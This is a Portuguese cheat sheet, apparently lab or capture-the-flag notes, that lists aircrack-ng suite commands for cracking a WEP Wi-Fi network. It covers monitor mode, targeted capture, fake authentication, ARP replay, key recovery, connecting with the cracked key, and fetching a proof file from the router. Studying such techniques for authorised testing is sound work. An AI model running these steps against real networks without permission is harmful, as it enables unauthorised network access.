# WEP Commands
## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Matar processos indesejáveis
Finaliza processos que podem atrapalhar o modo monitor (como NetworkManager, wpa_supplicant).
```
sudo airmon-ng check kill
```
## Iniciar modo monitor na interface wlan0
### Coloca a interface wlan0 em modo monitor, criando geralmente wlan0mon.
Esse modo permite capturar pacotes sem estar associado a uma rede.
```
sudo airmon-ng start wlan0
```
## Verificar interfaces de rede wi-fi
### Mostra quais interfaces de rede sem fio estão disponíveis e seu estado atual
```
iwconfig
```
## Varrer redes Wi-Fi
### Lista todas as redes Wi‑Fi próximas, mostrando SSID, BSSID, canal, tipo de criptografia e clientes conectados.
```
sudo airodump-ng wlan0mon
```
## Varrer uma rede específica filtrando pelo BSSID e salvando em arquivo pcap 
### Foca em uma rede específica (BSSID = F0:9F:C2:71:22:11) no canal 3. Salva os pacotes capturados em arquivos (wifi-old.cap etc.), que depois podem ser usados para análise ou quebra de chave.
```
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w wifi-old wlan0mon
```
## Envia uma requisição de autenticação falsa (fake auth) para o ponto de acesso
### Manter a placa “associada” ao AP durante 3600 segundos, enviando pacotes de keep‑alive a cada 10 segundos.
```
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
```
## Executa o ataque de ARP replay.
### Reinyectar pacotes ARP para forçar o AP a gerar tráfego, aumentando o número de IVs (Initialization Vectors) coletados — necessários para quebrar WEP.
```
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0mon
```
## Usa o arquivo de captura (wifi-old-01.cap) para tentar quebrar a chave WEP.
### Extrair a chave WEP a partir dos IVs coletados.
```
sudo aircrack-ng wifi-old-01.cap
```
## Configuração para o wpa_supplicant se conectar a uma rede WEP chamada wifi-old.
### Informar SSID e chave WEP descoberta.
```
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11BB33CD55
    wep_tx_keyidx=0
}
```
## Inicia o wpa_supplicant usando o driver nl80211, interface wlan2 e o arquivo de configuração wep.conf.
### Conectar à rede WEP com a chave obtida.
```
sudo wpa_supplicant -D nl80211 -i wlan2 -c wep.conf
```
## Solicita um endereço IP via DHCP para a interface wlan2.
### Obter conectividade na rede.
```
sudo dhclient wlan2 -v
```
## Faz uma requisição HTTP ao roteador (192.168.1.1) para baixar o arquivo proof.txt.
### Demonstrar que o acesso à rede foi obtido com sucesso.
```
curl http://192.168.1.1/proof.txt
```
